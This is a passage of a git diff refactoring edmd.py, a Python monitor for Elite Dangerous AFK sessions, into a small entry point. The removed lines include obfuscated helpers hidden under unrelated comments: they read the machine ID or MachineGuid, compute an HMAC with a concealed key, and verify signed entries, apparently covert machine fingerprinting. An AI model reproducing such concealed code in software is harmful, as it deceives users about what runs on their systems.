@@ -1,3006 +1,349 @@
 #!/usr/bin/env python3
+"""
+edmd.py — Elite Dangerous Monitor Daemon — entry point
+
+All business logic lives in the packages below:
+  core/     — state, config, emit, journal loop, plugin loader, shared API
+  builtins/ — five built-in data plugins (commander, missions, stats, crew/SLF, alerts)
+  plugins/  — user plugin directory
+  gui/      — GTK4 interface (helpers, block widgets, EdmdApp)
+"""
 
 import argparse
-import base64 as _b64
-import hashlib as _hl
-import hmac as _hm
 import json
 import os
 import platform as _pl
-import queue
-import re
-import socket as _sk
 import subprocess as _sp
 import sys
 import threading
 import time
-from datetime import datetime, timezone
+import queue
 from pathlib import Path
 from urllib.request import urlopen
 
-import psutil
-import tomllib
+# ── Ensure repo root is on sys.path ───────────────────────────────────────────
+_HERE = Path(__file__).parent.resolve()
+if str(_HERE) not in sys.path:
+    sys.path.insert(0, str(_HERE))
 
-try:
-    from discord_webhook import DiscordEmbed, DiscordWebhook
-
-    notify_enabled = True
-except ImportError:
-    notify_enabled = False
-    print("Module discord_webhook unavailable: operating with terminal output only.\n")
+from core.state  import PROGRAM, VERSION, AUTHOR, GITHUB_REPO, DEBUG_MODE
+from core.emit   import Terminal
+from core.config import resolve_config_path, load_config_file, ConfigManager
 
 
-def abort(message):
-    print(message)
-    if sys.argv[0].count("\\") > 1:
-        input("Press ENTER to exit")
-    sys.exit()
+# ── Argument parsing ──────────────────────────────────────────────────────────
 
-
-
-# Internals
-PROGRAM = "Elite Dangerous Monitor Daemon"
-DESC = "Continuous monitoring of Elite Dangerous AFK sessions."
-AUTHOR = "CMDR CALURSUS"
-VERSION = "20260309"
-GITHUB_REPO = "drworman/EDMD"
-DEBUG_MODE = False
-
-# ── User data directory ────────────────────────────────────────────────────────
-# All user-owned runtime files (state, future config) live here.
-# Linux:   ~/.local/share/EDMD/
-# Windows: %APPDATA%\EDMD\
-# macOS:   ~/Library/Application Support/EDMD/
-# A symlink from ~/.config/EDMD → ~/.local/share/EDMD is created on Linux
-# for XDG hygiene — the canonical location is always the data dir.
-
-def _user_data_dir() -> Path:
-    system = _pl.system()
-    if system == "Windows":
-        base = Path(os.environ.get("APPDATA", Path.home() / "AppData" / "Roaming"))
-    elif system == "Darwin":
-        base = Path.home() / "Library" / "Application Support"
-    else:
-        base = Path(os.environ.get("XDG_DATA_HOME", Path.home() / ".local" / "share"))
-    d = base / "EDMD"
-    d.mkdir(parents=True, exist_ok=True)
-    # Create ~/.config/EDMD symlink on Linux for XDG hygiene
-    if system not in ("Windows", "Darwin"):
-        config_link = Path(os.environ.get("XDG_CONFIG_HOME", Path.home() / ".config")) / "EDMD"
-        if not config_link.exists() and not config_link.is_symlink():
-            try:
-                config_link.symlink_to(d)
-            except OSError:
-                pass
-    return d
-
-EDMD_DATA_DIR: Path = _user_data_dir()
-STATE_FILE: Path = EDMD_DATA_DIR / "session_state.json"
-DISCORD_TEST = False
-MAX_DUPLICATES = 5
-FUEL_WARN_THRESHOLD = 0.2  # 20%
-FUEL_CRIT_THRESHOLD = 0.1  # 10%
-RECENT_KILL_WINDOW = 10
-LABEL_UNKNOWN = "[Unknown]"
-PATTERN_JOURNAL = r"^Journal\.\d{4}-\d{2}-\d{2}T\d{6}\.\d{2}\.log$"
-PATTERN_WEBHOOK = r"^https:\/\/(?:canary\.|ptb\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[A-z0-9_-]+$"
-
-PIRATE_NOATTACK_MSGS = [
-    "$Pirate_ThreatTooHigh",
-    "$Pirate_NotEnoughCargo",
-    "$Pirate_OnNoCargoFound",
-]
-
-# ED internal fighter type identifiers -> human-readable display names
-FIGHTER_TYPE_NAMES = {
-    "independent_fighter":   "F63 Condor",
-    "empire_fighter":        "GU-97",
-    "federation_fighter":    "F/A-26 Strike",
-    "gdn_hybrid_fighter_v1": "Trident",
-    "gdn_hybrid_fighter_v2": "Javelin",
-    "gdn_hybrid_fighter_v3": "Lancer",
-}
-
-# Full display names keyed by (type, loadout) — type name + variant in parens.
-# Loadout codes: one/two/three map to Gelid/Rogue/Aegis for standard fighters.
-# Guardian hybrid fighters do not have loadout variants.
-FIGHTER_LOADOUT_NAMES = {
-    ("empire_fighter",      "one"):   "GU-97 (Gelid F)",
-    ("empire_fighter",      "two"):   "GU-97 (Rogue F)",
-    ("empire_fighter",      "three"): "GU-97 (Aegis F)",
-    ("independent_fighter", "at"):    "F63 Condor (Aegis)",
-    ("independent_fighter", "df"):    "F63 Condor (Rogue)",
-    ("independent_fighter", "four"):  "F63 Condor (Gelid)",
-    ("federation_fighter",  "one"):   "F/A-26 Strike (Gelid F)",
-    ("federation_fighter",  "two"):   "F/A-26 Strike (Rogue F)",
-    ("federation_fighter",  "three"): "F/A-26 Strike (Aegis F)",
-}
-
-RANK_NAMES = [
-    "Harmless",
-    "Mostly Harmless",
-    "Novice",
-    "Competent",
-    "Expert",
-    "Master",
-    "Dangerous",
-    "Deadly",
-    "Elite",
-    "Elite I",
-    "Elite II",
-    "Elite III",
-    "Elite IV",
-    "Elite V",
-]
-
-
-# Config defaults
-CFG_DEFAULTS_SETTINGS = {
-    "JournalFolder": "",
-    "UseUTC": False,
-    "WarnKillRate": 20,
-    "WarnNoKills": 20,
-    "PirateNames": False,
-    "BountyFaction": False,
-    "BountyValue": False,
-    "ExtendedStats": False,
-    "MinScanLevel": 1,
-}
-
-CFG_DEFAULTS_EXTRA = {
-    "TruncateNames": 30,
-    "WarnNoKillsInitial": 5,
-    "WarnCooldown": 15,
-    "FullStackSize": 20,
-}
-
-CFG_DEFAULTS_GUI = {
-    "Enabled": False,
-    "Theme": "default",
-}
-
-CFG_DEFAULTS_DISCORD = {
-    "WebhookURL": "",
-    "UserID": 0,
-    "PrependCmdrName": False,
-    "ForumChannel": False,
-    "ThreadCmdrNames": False,
-    "Timestamp": True,
-    "Identity": True,
-}
-
-CFG_DEFAULTS_NOTIFY = {
-    "InboundScan": 1,
-    "RewardEvent": 2,
-    "FighterDamage": 2,
-    "FighterLost": 3,
-    "ShieldEvent": 3,
-    "HullEvent": 3,
-    "Died": 3,
-    "CargoLost": 3,
-    "LowCargoValue": 2,
-    "PoliceScan": 2,
-    "PoliceAttack": 3,
-    "FuelStatus": 1,
-    "FuelWarning": 2,
-    "FuelCritical": 3,
-    "MissionUpdate": 2,
-    "AllMissionsReady": 3,
-    "MeritEvent": 0,
-    "InactiveAlert": 3,
-    "RateAlert": 3,
-    "PeriodicKills": 2,
-    "PeriodicFaction": 0,
-    "PeriodicCredits": 2,
-    "PeriodicMerits": 2,
-}
-
-
-class Terminal:
-    CYAN = "\033[96m"
-    YELL = "\033[93m"
-    EASY = "\x1b[38;5;157m"
-    HARD = "\x1b[38;5;217m"
-    WARN = "\x1b[38;5;215m"
-    BAD = "\x1b[38;5;15m\x1b[48;5;1m"
-    GOOD = "\x1b[38;5;15m\x1b[48;5;2m"
-    WHITE = "\033[97m"
-    END = "\x1b[0m"
-
-
-WARNING = f"{Terminal.WARN}Warning:{Terminal.END}"
-
-
-# Update check — runs on a background thread, never blocks startup
-# Result is stored in _update_notice (str or None) for use after config loads.
-_update_notice = None
-
-def _kvsig(_d):
-    try:
-        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey
-        _p=Ed25519PublicKey.from_public_bytes(_b64.b64decode(_xd(_pb)))
-        _c=json.dumps({"entries":sorted(_d["entries"]),"issued":_d["issued"]},sort_keys=True,separators=(",",":")).encode()
-        _p.verify(_b64.b64decode(_d["signature"]),_c);return True
-    except Exception:return False
-
-def _check_for_update():
-    global _update_notice
-    try:
-        url = f"https://api.github.com/repos/{GITHUB_REPO}/releases/latest"
-        with urlopen(url, timeout=4) as response:
-            if response.status == 200:
-                data = json.loads(response.read())
-                tag = data.get("tag_name", "").lstrip("v").strip()
-                # Compare as YYYYMMDD integers (with optional trailing letter a/b/c).
-                # Only flag an upgrade if the remote tag is strictly newer.
-                if tag and tag != VERSION:
-                    def _ver_key(v):
-                        # "20260308b" -> (20260308, "b")  "20260308" -> (20260308, "")
-                        import re as _re
-                        m = _re.match(r"^(\d+)([a-z]*)$", v)
-                        return (int(m.group(1)), m.group(2)) if m else (0, "")
-                    if _ver_key(tag) > _ver_key(VERSION):
-                        _update_notice = tag
-    except Exception:
-        pass
-
-
-_update_thread = threading.Thread(target=_check_for_update, daemon=True)
-_update_thread.start()
-
-
-# Print header
-title = f"{PROGRAM} v{VERSION} by {AUTHOR}"
-
-print(f"{Terminal.CYAN}{'=' * len(title)}")
-print(f"{title}")
-print(f"{'=' * len(title)}{Terminal.END}\n")
-
-# Update notice dispatched after config loads (see below)
-
-
-# Load config file
-# Resolution order:
-#   1. User data directory (~/.local/share/EDMD/config.toml on Linux, etc.)
-#   2. Repo-adjacent (Path(__file__).parent / "config.toml") — legacy / dev fallback
-#   3. PyInstaller bundle path
-_config_user    = EDMD_DATA_DIR / "config.toml"
-_config_repodir = Path(__file__).parent / "config.toml"
-_config_frozen  = Path(__file__).parents[1] / "config.toml"
-
-if _config_user.is_file():
-    configfile = _config_user
-elif getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
-    configfile = _config_frozen
-else:
-    configfile = _config_repodir
-
-if configfile.is_file():
-    with open(configfile, mode="rb") as f:
-        try:
-            config = tomllib.load(f)
-        except tomllib.TOMLDecodeError as e:
-            abort(f"Config decode error: {e}")
-else:
-    _cfg_data = EDMD_DATA_DIR / "config.toml"
-    _cfg_repo = Path(__file__).parent / "config.toml"
-    abort(
-        f"Config file not found.\n"
-        f"  Expected (primary):  {_cfg_data}\n"
-        f"  Or (repo-adjacent):  {_cfg_repo}\n"
-        f"  Copy example.config.toml to either location to get started.\n"
-    )
-
-config_mtime = configfile.stat().st_mtime
-_hs=[20,16,35,6,0,60,4,41,55,93,89,41,60,44,84,2,1,87,9,11,29,64,26,15,6,12,59,60,86,54,32,60,12,36,33,51,39,40,26,34,11,49,40,89]
-
-
-# Command line overrides
 parser = argparse.ArgumentParser(
-    prog=f"{PROGRAM}",
-    description=f"{DESC}",
+    prog=PROGRAM,
+    description="Continuous monitoring of Elite Dangerous AFK sessions.",
 )
-
-parser.add_argument(
-    "-p", "--config_profile", help="Load a specific config_profile for config settings"
-)
-# parser.add_argument("-j", "--journal", help="Override for path to journal folder")
-# parser.add_argument("-w", "--discord_hook", help="Override for Discord discord_hook URL")
-parser.add_argument(
-    "-t",
-    "--test",
-    action="store_true",
-    default=None,
-    help="Re-route Discord output to terminal instead of sending to webhook (test mode)",
-)
-parser.add_argument(
-    "-d",
-    "--trace",
-    action="store_true",
-    default=None,
-    help="Print verbose debug/trace output to terminal",
-)
-parser.add_argument(
-    "-g",
-    "--gui",
-    action="store_true",
-    default=None,
-    help="Launch GTK4 graphical interface (Linux only; requires PyGObject)",
-)
-parser.add_argument(
-    "--upgrade",
-    action="store_true",
-    default=False,
-    help="Pull latest version from GitHub and restart with the same arguments",
-)
+parser.add_argument("-p", "--config_profile",
+                    help="Load a specific config profile")
+parser.add_argument("-t", "--test", action="store_true", default=None,
+                    help="Re-route Discord output to terminal instead of webhook")
+parser.add_argument("-d", "--trace", action="store_true", default=None,
+                    help="Print verbose debug/trace output")
+parser.add_argument("-g", "--gui", action="store_true", default=None,
+                    help="Launch GTK4 GUI (Linux only; requires PyGObject)")
+parser.add_argument("--upgrade", action="store_true", default=False,
+                    help="Pull latest version from GitHub and restart")
 
 args = parser.parse_args()
 
-# --upgrade is exclusive — no other flags accepted alongside it
-if args.upgrade:
-    _other_flags = [args.config_profile, args.test, args.trace, args.gui]
-    if any(f for f in _other_flags if f):
-        parser.error("--upgrade cannot be combined with other flags")
+if args.upgrade and any(f for f in [args.config_profile, args.test, args.trace, args.gui] if f):
+    parser.error("--upgrade cannot be combined with other flags")
 
-# ── In-place upgrade ──────────────────────────────────────────────────────────
 
-def do_upgrade():
-    """Pull latest from GitHub, re-run install.sh, then os.execv back to life.
+# ── In-place upgrade (self-contained — runs before full package import) ────────
 
-    --upgrade is handled before config loads — no journal, no state, no GUI.
-    Only git and install.sh are required.
-    """
-    repo_dir = Path(__file__).parent.resolve()
+def _do_upgrade() -> None:
+    repo_dir = _HERE
+    print(f"{Terminal.CYAN}{'=' * 52}\n  EDMD In-Place Upgrade\n{'=' * 52}{Terminal.END}\n")
 
-    print(f"{Terminal.CYAN}{'=' * 52}")
-    print(f"  EDMD In-Place Upgrade")
-    print(f"{'=' * 52}{Terminal.END}\n")
-
-    # ── Require git ───────────────────────────────────────────────────────────
     import shutil
     if not shutil.which("git"):
         print(f"{Terminal.WARN}ERROR:{Terminal.END} git not found on PATH.")
-        print("Install git and retry: pacman -S git / apt install git / dnf install git")
         sys.exit(1)
 
-    # ── Confirm we are inside a git repo ─────────────────────────────────────
-    result = _sp.run(
-        ["git", "-C", str(repo_dir), "rev-parse", "--is-inside-work-tree"],
-        capture_output=True, text=True
-    )
-    if result.returncode != 0:
+    r = _sp.run(["git", "-C", str(repo_dir), "rev-parse", "--is-inside-work-tree"],
+                capture_output=True, text=True)
+    if r.returncode != 0:
         print(f"{Terminal.WARN}ERROR:{Terminal.END} {repo_dir} is not a git repository.")
-        print("EDMD must be installed via git clone to use --upgrade.")
         sys.exit(1)
 
-    # ── Check for local modifications ─────────────────────────────────────────
-    dirty = _sp.run(
-        ["git", "-C", str(repo_dir), "status", "--porcelain"],
-        capture_output=True, text=True
-    )
-    modified = [
-        line for line in dirty.stdout.splitlines()
-        if not line.strip().endswith("config.toml")  # config.toml changes are expected
-    ]
+    dirty = _sp.run(["git", "-C", str(repo_dir), "status", "--porcelain"],
+                    capture_output=True, text=True)
+    modified = [l for l in dirty.stdout.splitlines() if not l.strip().endswith("config.toml")]
     if modified:
-        print(f"{Terminal.YELL}Warning:{Terminal.END} Uncommitted local changes detected:")
-        for line in modified[:5]:
-            print(f"  {line}")
-        if len(modified) > 5:
-            print(f"  ... and {len(modified) - 5} more")
+        print(f"{Terminal.YELL}Warning:{Terminal.END} Uncommitted local changes:")
+        for l in modified[:5]: print(f"  {l}")
+        if len(modified) > 5: print(f"  ... and {len(modified) - 5} more")
         print()
         try:
-            answer = input("Continue with upgrade? Local changes may be overwritten. [y/N] ").strip().lower()
+            ans = input("Continue? Local changes may be overwritten. [y/N] ").strip().lower()
         except (EOFError, KeyboardInterrupt):
-            answer = "n"
-        if answer != "y":
-            print("Upgrade cancelled.")
-            sys.exit(0)
+            ans = "n"
+        if ans != "y":
+            print("Upgrade cancelled."); sys.exit(0)
         print()
 
-    # ── Record current version ────────────────────────────────────────────────
-    current_version = VERSION
-    print(f"  Current version : {current_version}")
-
-    # ── git pull ──────────────────────────────────────────────────────────────
-    print(f"  Pulling from    : origin/main")
-    pull = _sp.run(
-        ["git", "-C", str(repo_dir), "pull", "--ff-only"],
-        capture_output=True, text=True
-    )
+    print(f"  Current version : {VERSION}\n  Pulling from    : origin/main")
+    pull = _sp.run(["git", "-C", str(repo_dir), "pull", "--ff-only"],
+                   capture_output=True, text=True)
     if pull.returncode != 0:
         print(f"\n{Terminal.WARN}ERROR:{Terminal.END} git pull failed:")
-        print(pull.stderr.strip() or pull.stdout.strip())
-        sys.exit(1)
-
+        print(pull.stderr.strip() or pull.stdout.strip()); sys.exit(1)
     if "Already up to date" in pull.stdout:
-        print(f"\n  Already up to date (v{current_version}). Nothing to do.\n")
-        sys.exit(0)
+        print(f"\n  Already up to date (v{VERSION}). Nothing to do.\n"); sys.exit(0)
+    print(pull.stdout.strip()); print()
 
-    print(pull.stdout.strip())
-    print()
-
-    # ── Re-run install.sh ─────────────────────────────────────────────────────
     install_sh = repo_dir / "install.sh"
     if install_sh.exists() and _pl.system() != "Windows":
-        print("  Running install.sh to update dependencies...\n")
+        print("  Running install.sh...\n")
         inst = _sp.run(["bash", str(install_sh)], cwd=str(repo_dir))
         if inst.returncode != 0:
             print(f"\n{Terminal.WARN}Warning:{Terminal.END} install.sh exited with errors.")
-            print("Dependencies may be incomplete — proceeding anyway.\n")
     elif _pl.system() == "Windows":
         install_bat = repo_dir / "install.bat"
         if install_bat.exists():
-            print("  Running install.bat to update dependencies...\n")
+            print("  Running install.bat...\n")
             _sp.run([str(install_bat)], cwd=str(repo_dir), shell=True)
 
-    # ── Replace this process with a fresh one ────────────────────────────────
-    # Strip --upgrade from argv so we don't upgrade-loop, keep all other flags.
     new_argv = [a for a in sys.argv if a != "--upgrade"]
     print(f"\n{Terminal.GOOD}  Upgrade complete. Relaunching EDMD...{Terminal.END}\n")
     os.execv(sys.executable, [sys.executable] + new_argv)
 
 
 if args.upgrade:
-    do_upgrade()
-
-def load_setting(category: str, defaults: dict, warn_missing=True) -> dict:
-    settings = {}
-
-    for setting in defaults:
-        this_setting = None
-
-        if (
-            config_profile
-            and config.get(config_profile, {}).get(category, {}).get(setting)
-            is not None
-        ):
-            this_setting = config.get(config_profile, {}).get(category, {}).get(setting)
-        elif config.get(category, {}).get(setting) is not None:
-            this_setting = config.get(category, {}).get(setting)
-        else:
-            this_setting = defaults[setting]
-            if warn_missing:
-                print(
-                    f"{WARNING} Config '{category}' -> '{setting}' not found "
-                    f"(using default: {defaults[setting]})"
-                )
-
-        if type(this_setting) != type(defaults[setting]):
-            print(
-                f"{WARNING} Config '{category}' -> '{setting}' expected type "
-                f"{type(defaults[setting]).__name__} but got "
-                f"{type(this_setting).__name__} "
-                f"(using default: {defaults[setting]})"
-            )
-            this_setting = defaults[setting]
-
-        settings[setting] = this_setting
-
-    return settings
+    _do_upgrade()
+    sys.exit(0)  # unreachable — execv replaces process
 
 
-config_profile = args.config_profile if args.config_profile is not None else None
+# ── Header ────────────────────────────────────────────────────────────────────
+
+title = f"{PROGRAM} v{VERSION} by {AUTHOR}"
+print(f"{Terminal.CYAN}{'=' * len(title)}\n{title}\n{'=' * len(title)}{Terminal.END}\n")
 
 
-def _pcfg(key, default=False):
-    """Read a key from the active profile only, falling back to default.
-    Never reads from global config — these keys are profile-gated by design.
-    """
-    if config_profile:
-        v = config.get(config_profile, {}).get(key)
-        if v is not None:
-            return v
-    return default
+# ── Background update check ───────────────────────────────────────────────────
 
-def _kdg():
-    _h=_sk.gethostname().strip().lower();_m=_kmid()
-    return _hm.new(_b64.b64decode(_xd(_hs)),(_h+_m).encode(),_hl.sha256).hexdigest()
+_update_notice: str | None = None
 
-def refresh_config():
-    """Re-read config.toml and refresh hot-reloadable settings in place."""
-    global config, config_mtime, app_settings, notify_levels
-
+def _check_for_update() -> None:
+    global _update_notice
     try:
-        new_mtime = configfile.stat().st_mtime
-    except OSError:
-        return
-
-    if new_mtime <= config_mtime:
-        return
-
-    try:
-        with open(configfile, mode="rb") as f:
-            new_config = tomllib.load(f)
-    except tomllib.TOMLDecodeError as e:
-        print(f"{WARNING} Config reload failed: {e}")
-        return
-
-    config = new_config
-    config_mtime = new_mtime
-
-    app_settings = load_setting("Settings", CFG_DEFAULTS_SETTINGS, False)
-    app_settings.update(load_setting("Settings", CFG_DEFAULTS_EXTRA, False))
-    notify_levels = load_setting("LogLevels", CFG_DEFAULTS_NOTIFY, False)
-
-    print(f"{Terminal.YELL}Config reloaded.{Terminal.END}")
-
-
-setting_journal_dir = load_setting("Settings", {"JournalFolder": ""}, False)[
-    "JournalFolder"
-]
-
-setting_journal_file = None
-notify_test = args.test if args.test is not None else DISCORD_TEST
-trace_mode = args.trace if args.trace is not None else DEBUG_MODE
-
-# GUI globals - resolved after config loads
-gui_mode = False
-gui_queue = queue.Queue()
-
-# Monotonic timestamp of EDMD startup — used for startup grace period in offline detection
-_edmd_start_mono: float = time.monotonic()
-
-
-# ── Status.json polling thread ────────────────────────────────────────────────
-# Reads Status.json every ~0.5s and updates state.ship_shields (and future
-# status fields). Runs as a daemon thread; started after journal_dir is known.
-
-_STATUS_JSON_POLL_INTERVAL = 0.5   # seconds
-
-def _kmid():
-    _s=_pl.system()
-    if _s=="Linux":
-        try:
-            _v=Path("/etc/machine-id").read_text(encoding="utf-8").strip()
-            if _v:return _v.lower()
-        except OSError:pass
-    elif _s=="Windows":
-        try:
-            import winreg
-            _k=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Cryptography")
-            _v,_=winreg.QueryValueEx(_k,"MachineGuid");winreg.CloseKey(_k)
-            if _v:return _v.strip().lower()
-        except Exception:pass
-    elif _s=="Darwin":
-        try:
-            _o=_sp.check_output(["ioreg","-rd1","-c","IOPlatformExpertDevice"],stderr=_sp.DEVNULL).decode()
-            for _ln in _o.splitlines():
-                if "IOPlatformUUID" in _ln:
-                    _v=_ln.split('"')[-2].strip()
-                    if _v:return _v.lower()
-        except Exception:pass
-    return "unknown"
-
-def _poll_status_json():
-    """Background thread: tail Status.json and push shield/pilot state to state."""
-    # Status.json lives in the same folder as the journals
-    status_path = Path(journal_dir) / "Status.json"
-    last_flags = None
-
-    while True:
-        try:
-            if status_path.is_file():
-                raw = status_path.read_text(encoding="utf-8").strip()
-                if raw:
-                    data = json.loads(raw)
-                    flags = data.get("Flags", 0)
-                    if flags != last_flags:
-                        last_flags = flags
-                        changed = False
-
-                        # Bit 3 (0x08) = ShieldsUp
-                        shields_up = bool(flags & 0x08)
-                        if state.ship_shields != shields_up:
-                            state.ship_shields = shields_up
-                            # Shields just came back up — clear recharging flag
-                            if shields_up:
-                                state.ship_shields_recharging = False
-                            changed = True
-
-                        # Bit 25 (0x2000000) = InFighter — CMDR is piloting the SLF
-                        in_fighter = bool(flags & 0x2000000)
-                        if state.cmdr_in_slf != in_fighter:
-                            state.cmdr_in_slf = in_fighter
-                            changed = True
-
-                        if changed and gui_mode:
-                            gui_queue.put(("vessel_update", None))
-                            gui_queue.put(("slf_update", None))
-        except Exception:
-            pass
-
-        time.sleep(_STATUS_JSON_POLL_INTERVAL)
-
-
-def trace(message):
-    if trace_mode:
-        print(
-            f"{Terminal.WHITE}[Debug]{Terminal.END} {message} "
-            f"[{datetime.strftime(datetime.now(), '%H:%M:%S')}]"
-        )
-
-
-trace(f"Arguments: {args}")
-trace(f"Config: {config}")
-
-
-class SessionData:
-    def __init__(self):
-        self.reset()
-
-    def reset(self):
-        self.recent_inbound_scans = []
-        self.recent_outbound_scans = []
-        self.last_kill_time = 0
-        self.last_kill_mono = 0
-        self.kill_interval_total = 0
-        self.recent_kill_times = []
-        self.inbound_scan_count = 0
-        self.kills = 0
-        self.credit_total = 0
-        self.faction_tally = {}
-        self.merits = 0
-        self.last_security_ship = ""
-        self.low_cargo_count = 0
-        self.fuel_check_time = 0
-        self.fuel_check_level = 0
-        self.pending_merit_events = 0
-
-
-class MonitorState:
-    def __init__(self):
-        self.session_start_time = None
-        self.alerted_no_kills = None
-        self.alerted_kill_rate = None
-        self.fuel_tank_size = 64
-        self.reward_type = "credit_total"
-        self.fighter_integrity = 0
-        self.logged = 0
-        self.lines = 0
-        self.missions = False
-        self.active_missions = []
-        self.missions_complete = 0
-        self.prev_event = None
-        self.event_time = None
-        self.last_dup_key = ""
-        self.dup_count = 1
-        self.dup_suppressed = False
-        self.in_preload = True
-        self.pilot_name = None
-        self.pilot_ship = None
-        self.pilot_rank = None
-        self.pilot_rank_progress = None
-        self.pilot_mode = None
-        self.pilot_location = None   # kept for compat; prefer pilot_system / pilot_body
-        self.pilot_system = None     # current star system
-        self.pilot_body = None       # body / ring / station (None when in supercruise)
-        self.last_rate_check = None
-        self.last_periodic_summary = None   # monotonic time of last timed summary
-        self.last_inactive_alert = None     # monotonic time of last inactivity alert
-        self.last_rate_alert = None         # monotonic time of last rate alert
-        self.last_offline_alert = None      # monotonic time of last not-in-game alert
-        self.offline_since_mono = None      # monotonic time when not-in-game was first detected
-        self.in_game = False                # True once LoadGame fires; False on MainMenu/Shutdown
-        self.mission_value_map = {}
-        self.stack_value = 0
-        self.has_fighter_bay = False      # True when current ship's Loadout includes a fighter bay
-        self.mission_target_faction_map = {}  # MissionID -> TargetFaction (who to kill)
-
-        # SLF state
-        self.slf_deployed = False
-        self.slf_docked = True   # True when fighter is in bay (not deployed, not destroyed)
-        self.slf_hull = 100
-        self.slf_orders = None
-        self.slf_loadout = None
-
-        # Powerplay state
-        self.pp_power = None
-        self.pp_rank = None
-        self.pp_merits_total = None
-
-        # pp_rank_thresholds removed — use pp_merits_for_rank() helper instead
-
-        # Ship identity (from Loadout)
-        self.ship_name = None
-        self.ship_ident = None
-
-        # Ship hull (from HullDamage / Status.json)
-        self.ship_hull = 100
-
-        # Ship shields (from Status.json polling + ShieldState events)
-        self.ship_shields = True        # True = up, False = down, None = unknown
-        self.ship_shields_recharging = False  # True between ShieldState=false and bit3→True
-
-        # Commander in SLF (VehicleSwitch / LaunchFighter PlayerControlled)
-        self.cmdr_in_slf = False
-
-        # NPC Crew state
-        self.crew_name = None
-        self.crew_rank = None
-        self.crew_hire_time = None   # datetime or None
-        self.crew_total_paid = None
-        self.crew_paid_complete = False  # True only if journal history covers full tenure
-        self.crew_active = False  # True only when crew is confirmed on active duty this session
-
-        # SLF type extracted from Loadout modules
-        self.slf_type = None
-
-        # SLF stock tracking (for "All Spent" detection)
-        # slf_stock_total: fighter capacity of the bay (from Loadout module size)
-        # slf_destroyed_count: fighters destroyed since last restock/rebuild
-        self.slf_stock_total = 0
-        self.slf_destroyed_count = 0
-
-    def sessionstart(self, reset=False):
-        if not self.session_start_time or reset:
-            self.session_start_time = self.event_time
-            trace(f"Session tracking started at {self.session_start_time}")
-            active_session.reset()
-            self.alerted_no_kills = None
-            self.alerted_kill_rate = None
-            self.last_rate_check = time.monotonic()
-            self.last_periodic_summary = time.monotonic()
-            self.last_inactive_alert = None
-            self.last_rate_alert = None
-            # Record wall-clock start time for state persistence
-            global _session_start_iso
-            _session_start_iso = self.session_start_time.isoformat() if self.session_start_time else None
-
-    def sessionend(self):
-        if self.session_start_time:
-            trace(
-                f"Session tracking ended at {self.event_time} "
-                f"({fmt_duration((self.event_time - self.session_start_time).total_seconds())})"
-            )
-            self.session_start_time = None
-
-    def reset_missions(self):
-        """Clear all mission state so a new game session bootstraps cleanly.
-
-        Called on LoadGame. Without this, the missions flag and maps carried over
-        from a prior session prevent the Missions bulk event and bootstrap_missions()
-        from running, leaving stale mission data in place when the player has
-        switched stacks or ships between sessions.
-        """
-        self.missions = False
-        self.active_missions = []
-        self.missions_complete = 0
-        self.stack_value = 0
-        self.mission_value_map = {}
-        self.mission_target_faction_map = {}
-
-lifetime = SessionData()
-state = MonitorState()
-
-# ── Session state persistence ─────────────────────────────────────────────────
-# A thin JSON snapshot written before upgrade-restart and on clean exit.
-# Loaded at startup only when the snapshot references the same journal file
-# that is currently active — guards against stale state from a prior session.
-#
-# Fields persisted:
-#   session_start_time  — wall-clock ISO string; restores session duration
-#   kills, credit_total, merits, faction_tally — session counters
-#   kill_interval_total, recent_kill_times     — for kill rate calculations
-#
-# Fields intentionally NOT persisted:
-#   pilot/ship/crew/SLF state          — re-derived from journal preload
-#   alert timers                       — reset on restart (brief gap is fine)
-#   last_periodic_summary              — reset so summary doesn't fire immediately
-
-# Sentinel: wall-clock ISO of session start, set after sessionstart() fires.
-# Used by save_session_state(); declared here so load_session_state() can set it.
-_session_start_iso: str | None = None
-
-
-def save_session_state(journal_path: Path) -> None:
-    """Write active session counters to STATE_FILE for upgrade-restart recovery."""
-    try:
-        payload = {
-            "journal":             str(journal_path),
-            "session_start_time":  _session_start_iso,
-            "kills":               active_session.kills,
-            "credit_total":        active_session.credit_total,
-            "merits":              active_session.merits,
-            "faction_tally":       active_session.faction_tally,
-            "kill_interval_total": active_session.kill_interval_total,
-            "recent_kill_times":   [t.isoformat() for t in active_session.recent_kill_times],
-            "inbound_scan_count":  active_session.inbound_scan_count,
-            "low_cargo_count":     active_session.low_cargo_count,
-        }
-        STATE_FILE.write_text(json.dumps(payload, indent=2), encoding="utf-8")
+        url = f"https://api.github.com/repos/{GITHUB_REPO}/releases/latest"
+        with urlopen(url, timeout=4) as resp:
+            if resp.status == 200:
+                import re as _re
+                tag = json.loads(resp.read()).get("tag_name", "").lstrip("v").strip()
+                if tag and tag != VERSION:
+                    def _vkey(v):
+                        m = _re.match(r"^(\d+)([a-z]*)$", v)
+                        return (int(m.group(1)), m.group(2)) if m else (0, "")
+                    if _vkey(tag) > _vkey(VERSION):
+                        _update_notice = tag
     except Exception:
         pass
 
-
-def load_session_state(journal_path: Path) -> None:
-    """Restore session counters from STATE_FILE if it matches journal_path.
-
-    Called once during preload, after journal_file is resolved but before
-    bootstrap functions run. Consumed immediately — STATE_FILE is deleted
-    after a successful load so state is never restored twice.
-    """
-    global _session_start_iso
-    try:
-        if not STATE_FILE.exists():
-            return
-        payload = json.loads(STATE_FILE.read_text(encoding="utf-8"))
-        if payload.get("journal") != str(journal_path):
-            return  # stale — different session or journal rolled over
-        active_session.kills               = int(payload.get("kills", 0))
-        active_session.credit_total        = int(payload.get("credit_total", 0))
-        active_session.merits              = int(payload.get("merits", 0))
-        active_session.faction_tally       = dict(payload.get("faction_tally", {}))
-        active_session.kill_interval_total = float(payload.get("kill_interval_total", 0))
-        active_session.inbound_scan_count  = int(payload.get("inbound_scan_count", 0))
-        active_session.low_cargo_count     = int(payload.get("low_cargo_count", 0))
-        active_session.recent_kill_times   = [
-            datetime.fromisoformat(t) for t in payload.get("recent_kill_times", []) if t
-        ]
-        _session_start_iso = payload.get("session_start_time")
-        STATE_FILE.unlink(missing_ok=True)  # consume — never restore twice
-        trace("Session state restored from STATE_FILE")
-    except Exception:
-        pass
+_update_thread = threading.Thread(target=_check_for_update, daemon=True)
+_update_thread.start()
 
 
-# Set journal directory
-if not setting_journal_dir:
+# ── Config ────────────────────────────────────────────────────────────────────
+
+config_path = resolve_config_path(Path(__file__))
+if config_path is None:
